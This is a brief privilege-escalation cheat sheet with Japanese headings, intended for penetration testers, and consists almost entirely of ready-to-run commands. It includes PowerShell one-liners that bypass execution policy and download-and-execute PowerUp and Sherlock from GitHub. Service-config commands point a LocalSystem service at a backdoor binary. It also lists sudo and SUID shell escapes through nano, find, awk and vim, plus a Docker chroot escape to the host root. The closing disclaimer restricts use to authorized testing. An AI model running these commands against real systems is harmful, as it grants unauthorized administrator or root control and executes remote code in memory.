# Privilege Escalation Techniques

## Windows 権限昇格

### 権限昇格の列挙
```powershell
# PowerUp を使用した脆弱性スキャン
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# Sherlock を使用した脆弱性スキャン
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"
```

### サービス権限昇格
```powershell
# サービスパス権限の確認
accesschk.exe -uwcqv "Authenticated Users" *

# サービス設定の変更
sc config upnphost binPath= "C:\path\to\backdoor.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost start= auto
```

## Linux 権限昇格

### SUID バイナリの探索
```bash
# SUID ビットが設定されたファイルを検索
find / -perm -u=s -type f 2>/dev/null

# 危険な SUID バイナリの利用例（nano）
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

### Sudo 権限の悪用
```bash
# Sudo 権限の確認
sudo -l

# 一般的な Sudo 権限昇格
sudo find /etc -exec sh -i \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c '!sh'
```

### Linux カーネル脆弱性
```bash
# カーネルバージョンの確認
uname -a
cat /proc/version

# 脆弱性の確認
searchsploit linux kernel $(uname -r)
```

### Docker 権限昇格
```bash
# Docker グループメンバーシップの確認
groups

# Docker を使用した権限昇格
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- システムに重大な損害を与える可能性があります
- 実環境での使用は違法となる可能性があります 